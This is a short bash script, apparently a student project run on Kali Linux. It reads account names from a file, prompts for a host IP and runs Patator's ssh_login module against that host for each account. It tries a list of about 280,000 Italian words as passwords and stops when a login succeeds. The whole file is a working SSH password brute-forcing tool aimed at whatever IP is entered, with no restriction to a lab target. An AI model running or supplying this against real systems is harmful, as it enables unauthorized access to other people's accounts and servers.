#!/bin/bash

file=/home/kali/progettoscriptbruteforcing/user1.txt

trovato=false
userarray=()

# Reads the users from the file and saves them into the array
for parola in $(awk '{print $1}' $file); do 
    userarray+=("$parola")
done

echo "Enter the IP address of the host:"
read ip
echo "Remember to insert the account names to attack in the user1.txt file under the home directory."

# Loop through the array of users
for ((i=0; i<${#userarray[@]}; i++)); do
    user=${userarray[i]}
    echo "Testing user: $user"

    # Executes Patator for the current user
    patator ssh_login host="$ip" user="$user" password=FILE0 0=/home/kali/Downloads/280000_parole_italiane.txt \
        -x ignore:mesg="Authentication failed." 2>&1 | while read line; do

        # Checks if the line contains a success message (SSH)
        if echo "$line" | grep -q "SSH"; then

            echo "Found a positive result for user: $user"
            echo "$line" # prints
            killall -q patator  # Stops Patator
            trovato=true
            break
        fi
    done

    # If a result was found, move to the next user
    if [[ "$trovato" == true ]]; then
        trovato=false  # Resets the flag to test the next user
        continue
    fi
done

echo "Script completed."
